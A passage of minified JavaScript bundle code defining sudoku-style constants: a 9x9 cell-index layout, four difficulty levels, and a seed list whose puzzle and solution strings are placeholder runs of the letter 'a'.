      Object.defineProperty(i, '__esModule', { value: !0 }),
        (i.BASE_LAYOUT = void 0),
        (i.BASE_LAYOUT = [
          [0, 1, 2, 3, 4, 5, 6, 7, 8],
          [9, 10, 11, 12, 13, 14, 15, 16, 17],
          [18, 19, 20, 21, 22, 23, 24, 25, 26],
          [27, 28, 29, 30, 31, 32, 33, 34, 35],
          [36, 37, 38, 39, 40, 41, 42, 43, 44],
          [45, 46, 47, 48, 49, 50, 51, 52, 53],
          [54, 55, 56, 57, 58, 59, 60, 61, 62],
          [63, 64, 65, 66, 67, 68, 69, 70, 71],
          [72, 73, 74, 75, 76, 77, 78, 79, 80],
        ]);
    },
    2042: (e, i) => {
      Object.defineProperty(i, '__esModule', { value: !0 }),
        (i.DIFFICULTY_LEVELS = void 0),
        (i.DIFFICULTY_LEVELS = ['easy', 'medium', 'hard', 'expert']);
    },
    5180: (e, i) => {
      Object.defineProperty(i, '__esModule', { value: !0 }),
        (i.SEEDS = void 0),
        (i.SEEDS = [
          {
            puzzle:
              'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-',
            solution:
              'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
            difficulty: 'easy',
          },
          {
            puzzle:
              'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-',
            solution:
              'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
            difficulty: 'medium',
          },
          {
            puzzle:
              'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-',
            solution:
              'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
            difficulty: 'hard',
          },
          {
            puzzle:
              'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-',
            solution:
              'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa',
            difficulty: 'expert',
          },
        ]);
    },
```

